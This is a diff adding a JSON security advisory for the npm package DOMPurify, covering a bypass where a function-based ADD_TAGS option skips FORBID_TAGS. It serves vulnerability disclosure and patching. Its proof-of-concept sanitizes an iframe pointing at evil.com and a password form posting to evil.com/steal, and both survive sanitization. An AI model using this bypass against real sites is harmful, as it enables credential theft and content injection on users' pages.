@@ -1,0 +1,53 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-04-22T17:34:18Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "dompurify"
+  },
+  "Advisory": {
+    "DatabaseId": 350735,
+    "Id": "GSA_kwCzR0hTQS1oN213LWdwdnIteHE0bc4ABVoP",
+    "GhsaId": "GHSA-h7mw-gpvr-xq4m",
+    "References": [
+      {
+        "Url": "https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m"
+      },
+      {
+        "Url": "https://github.com/cure53/DOMPurify/releases/tag/3.4.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-h7mw-gpvr-xq4m"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-h7mw-gpvr-xq4m"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-41240"
+      }
+    ],
+    "Description": "There is an inconsistency between FORBID_TAGS and FORBID_ATTR handling when function-based ADD_TAGS is used.\n\nCommit [c361baa](https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80) added an early exit for FORBID_ATTR at line 1214:\n\n    /* FORBID_ATTR must always win, even if ADD_ATTR predicate would allow it */\n    if (FORBID_ATTR[lcName]) {\n      return false;\n    }\n\nThe same fix was not applied to FORBID_TAGS. At line 1118-1123, when EXTRA_ELEMENT_HANDLING.tagCheck returns true, the short-circuit evaluation skips the FORBID_TAGS check entirely:\n\n    if (\n      !(\n        EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function \u0026\u0026\n        EXTRA_ELEMENT_HANDLING.tagCheck(tagName)  // true -\u003e short-circuits\n      ) \u0026\u0026\n      (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])  // never evaluated\n    ) {\n\nThis allows forbidden elements to survive sanitization with their attributes intact.\n\nPoC (tested against current HEAD in Node.js + jsdom):\n\n    const DOMPurify = createDOMPurify(window);\n\n    DOMPurify.sanitize(\n      '\u003ciframe src=\"https://evil.com\"\u003e\u003c/iframe\u003e',\n      {\n        ADD_TAGS: function(tag) { return true; },\n        FORBID_TAGS: ['iframe']\n      }\n    );\n    // Returns: '\u003ciframe src=\"https://evil.com\"\u003e\u003c/iframe\u003e'\n    // Expected: '' (iframe forbidden)\n\n    DOMPurify.sanitize(\n      '\u003cform action=\"https://evil.com/steal\"\u003e\u003cinput name=password\u003e\u003c/form\u003e',\n      {\n        ADD_TAGS: function(tag) { return true; },\n        FORBID_TAGS: ['form']\n      }\n    );\n    // Returns: '\u003cform action=\"https://evil.com/steal\"\u003e\u003cinput name=\"password\"\u003e\u003c/form\u003e'\n    // Expected: '\u003cinput name=\"password\"\u003e' (form forbidden)\n\nConfirmed affected: iframe, object, embed, form. The src/action/data attributes survive because attribute sanitization runs separately and allows these URLs.\n\nCompare with FORBID_ATTR which correctly wins:\n\n    DOMPurify.sanitize(\n      '\u003cp onclick=\"alert(1)\"\u003ehello\u003c/p\u003e',\n      {\n        ADD_ATTR: function(attr) { return true; },\n        FORBID_ATTR: ['onclick']\n      }\n    );\n    // Returns: '\u003cp\u003ehello\u003c/p\u003e' (onclick correctly removed)\n\nSuggested fix: add FORBID_TAGS early exit before the tagCheck evaluation, mirroring line 1214:\n\n    /* FORBID_TAGS must always win, even if ADD_TAGS predicate would allow it */\n    if (FORBID_TAGS[tagName]) {\n      // proceed to removal logic\n    }\n\nThis requires function-based ADD_TAGS in the config, which is uncommon. But the asymmetry with the FORBID_ATTR fix is clear, and the impact includes iframe and form injection with external URLs.\n\nReporter: Koda Reef",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-04-22T17:34:17Z",
+    "Severity": "MODERATE",
+    "Summary": "DOMPurify: FORBID_TAGS bypassed by function-based ADD_TAGS predicate (asymmetry with FORBID_ATTR fix)",
+    "UpdatedAt": "2026-04-22T17:34:18Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.4.0"
+      },
+      "VulnerableVersionRange": "\u003c 3.4.0"
+    }
+  ]
+}
